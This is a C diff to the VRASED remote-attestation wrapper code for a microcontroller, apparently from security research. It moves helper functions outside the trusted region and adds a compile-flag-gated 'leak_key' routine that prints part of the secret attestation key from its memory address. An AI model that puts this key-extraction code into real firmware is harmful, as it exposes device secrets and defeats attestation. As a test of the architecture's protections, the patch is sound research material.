@@ -1,5 +1,7 @@
 #include <string.h>
 
+/*********** TRUSTED VRASED WRAPPER CODE (inside SW-Att) ***********/
+
 #define MAC_ADDR 0x0230
 #define KEY_ADDR 0x6A00
 #define ATTEST_DATA_ADDR 0xE000
@@ -13,16 +15,6 @@ hmac(
   uint8_t *data,
   uint32_t datalen
 );
-
-void my_memset(uint8_t* ptr, int len, uint8_t val) {
-  int i=0;
-  for(i=0; i<len; i++) ptr[i] = val;
-}
-
-void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
-  int i=0;
-  for(i=0; i<size; i++) dst[i] = src[i];
-}
 
 __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() {
 
@@ -51,7 +43,36 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
     __asm__ volatile("br   r6" "\n\t");
 }
 
+/*********** UNTRUSTED VRASED WRAPPER CODE (outside SW-Att) ***********/
+#include <stdio.h>
+
+void my_memset(uint8_t* ptr, int len, uint8_t val) {
+  int i=0;
+  for(i=0; i<len; i++) ptr[i] = val;
+}
+
+void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
+  int i=0;
+  for(i=0; i<size; i++) dst[i] = src[i];
+}
+
+void leak_key(uint8_t *buf, int start, int end)
+{
+    printf("leak[%d:%d]: ", start, end-1);
+
+    for (int i = start; i < end; i++)
+        printf("%02x", *(buf+i));
+    printf("\n");
+}
+
 void VRASED (uint8_t *challenge, uint8_t *response) {
+    printf("Attack: %d\n", __ATTACK);
+
+    #if __ATTACK == 1
+      leak_key((uint8_t*) KEY_ADDR, 31, 64);
+      return;
+    #endif
+
     //Copy input challenge to MAC_ADDR:
     my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);
 
